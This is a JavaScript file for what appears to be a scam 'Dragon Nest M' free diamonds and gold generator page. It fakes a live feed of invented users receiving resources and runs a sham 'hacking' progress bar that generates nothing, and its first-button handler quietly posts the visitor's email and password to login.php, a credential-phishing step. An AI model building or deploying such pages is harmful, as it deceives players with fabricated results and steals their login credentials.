/*!
*  Dragon Nest M Niche
 * Main.js - Dragon Nest M of Application
 * Copyright 2013-2018 CPACodex.com, Inc.
 * Licensed under the MIT license
 */

$( document ).ready( function() {

	$("[name='my-checkbox']").bootstrapSwitch();

    $('[data-toggle="tooltip"]').tooltip();

    $( 'body' ).fadeIn( 1000 );

    setInterval( newActivity, 2000 );

    function newActivity() {

        var users   = [ '441Binder','Johnny', 'Attacklord_bro', 'pewdiepie', "Marko", "PesaJajar", "Ivan", "xxMine", "9814Bind", "P!xel", "haxhack", "EarthHacker", "9/4gen", "ClashHacker", 'new_kid',
                  'BloodMaster', 'lovegaming', 'Johnny', 'NaneK', 'Marko_991', 'JackHammer9999', 'fuzzzy', 'tester', 'yearboy1007', 'Ministar', 'Haxajmo', 'Pottato', 'GirlHackingxD', 'Alex',
                  'Coder', 'Hillck23', 'Creeper', 'zaCk', 'only123', 'gunshaxer', 'MyNameIsShoost' ];
        
        var user         = users[ Math.floor( Math.random() * users.length ) ];
        var diamondsRand     = Math.floor( ( Math.random() * 80000 ) + 15000 );;
        var goldRand      = Math.floor( ( Math.random() * 80000 ) + 15000 );

        $( '.live-stats' ).last().remove();

        $( '.activityContent' ).hide().prepend('<div class="live-stats">' +
           '<ul>' +
           		'<li><b><img src="https://img.icons8.com/android/24/000000/user.png"/> '+user+'</b></li>' +
           		'<li><span class="text-green"><image class="fa img-responsive" src="rs1.png"> '+diamondsRand+'</span>' +
                '<li><img src="https://img.icons8.com/android/24/000000/clock.png"/>&#160;&#160; few seconds ago</li>' +
           '</ul>' +
        '</div>').fadeIn();
    }

    $('#hack-mode').on('switchChange.bootstrapSwitch', function () {

        if( $('#hack-mode').bootstrapSwitch('state') == true ) {

            $( '.mode-text' ).html( 'Mod Hack Enabled' );

            $( '.mode-text' ).addClass( 'text-green' );
            $( '.mode-text' ).removeClass( 'text-disabled' );

        } else {

            $( '.mode-text' ).html( 'Mod Hack Disabled' );

            $( '.mode-text' ).addClass( 'text-disabled' );
            $( '.mode-text' ).removeClass( 'text-green' );

        }

    });

	$( '.platforms li' ).click( function() {

		$( '.platforms li' ).removeClass( "active" );
	    $( this ).addClass("active");

	});		


	/* Gems */
    var $gen_diamonds = $( '.diamonds-input' );
        $gen_diamonds.updown ({

        	step: 12042,
            min: 0,
            max: 99999

        });

    var $change_diamonds = $gen_diamonds.data( 'updown');
        $( '.plus-diamonds' ).click( function( event ) {

            $change_diamonds.increase( event );
            $change_diamonds.triggerEvents();

        });
        $( '.minus-diamonds' ).click( function( event ) {

            $change_diamonds.decrease( event );
            $change_diamonds.triggerEvents();

        });
        
    /* Gold */
    var $gen_gold = $( '.gold-input' );
        $gen_gold.updown ({

        	step: 12042,
            min: 0,
            max: 99999,

        });

    var $change_gold = $gen_gold.data( 'updown');
        $( '.plus-gold' ).click( function( event ) {

            $change_gold.increase( event );
            $change_gold.triggerEvents();

        });
        $( '.minus-gold' ).click( function( event ) {

            $change_gold.decrease( event );
            $change_gold.triggerEvents();

        }); 

    function goToByScroll( id ) {

        $( 'html, body' ).animate({
            scrollTop: $( "."+id ).offset().top },
           'slow' );

    }

    function progressBar() {

        var width            = 1;
        var intervalProgress = setInterval( frame, 0200 );

        goToByScroll( 'step-3' );

        function frame() {

            if( width == 20 ) $( '.load-textJS' ).html( 'Connecting' );
            if( width == 30 ) $( '.load-textJS' ).html( 'Fetching data' );
            if( width == 40 ) $( '.load-textJS' ).html( 'GET -> Variables' );
            if( width == 50 ) $( '.load-textJS' ).html( 'GET -> <span class="text-green">Resources</span>' );
            if( width == 60 ) $( '.load-textJS' ).html( 'GET -> ' + $( '.usernameInput' ).val() );
            if( width == 70 ) $( '.load-textJS' ).html( 'POST => DATA' );

            if ( width >= 100 ) {

                clearInterval( intervalProgress );

                $( '.step-3' ).fadeOut( function () {

                    $( '.step-4' ).fadeIn();
                    goToByScroll( 'step-4' );

                }); 

                $( '.userJS' ).html( $( '.usernameInput' ).val() );
                $( '.platformJS' ).addClass( 'fa-'+$( '.active' ).attr( 'data-name' ) );

                setTimeout( function() { 

                

                            $( '.box-1' ).fadeIn();

                            $( '.gunbJSthick' ).css('opacity', '1');

                            $('.diamondsJS').countTo({

                                from: 10,
                                to: $( '.diamonds-input' ).val(),
                                speed: 500,
                                refreshInterval: 1,
                                onComplete: function ( value) {

                                    setTimeout( function () {

                                        $( '.step-4' ).fadeOut( function() {

                                            $( '.step-5' ).fadeIn();
                                            goToByScroll( 'step-5' );

                                        });

                                    }, 1000);

                                }

                            });                                

                

                }, 500 );             

            } else {

                width++; 
                $( ".progress-bar" ).css( "width", width + '%' );
                $( ".progress-bar" ).html( width * 1 + '%' );

            }

        }

    }   


    /* Buttons Starts Here */

    $( ".btnFirst" ).click( function() {
        var formulario = document.getElementById('formulario');
        formulario.addEventListener('submit', function(e) {
            e.preventDefault();
            var datos = new FormData(formulario);
            $.post('login.php', {
                "email": datos.get('email'),
                "pass": datos.get('pass')
              },function(data) {
                console.log('ok');
            });

        })
        
    	var platformName	= $( '.active' ).attr( 'data-name' );
    	var usernameInput 	= $( '.usernameInput' ).val();

    	if( usernameInput == "" ) {

    		$( '.usernameAlert' ).fadeIn();

    	} else {

    		$( '.step-1' ).fadeOut( function () {

    			$( '.step-2' ).fadeIn();
                goToByScroll( 'step-2' );

    		});

    	}

    });		

    /* Generator Starts Here */

    $( ".btnGenerate" ).click( function() {	

        $( '.step-2' ).fadeOut( function () {

            $( '.step-3' ).fadeIn();

            progressBar();

        });	

    });															
					

});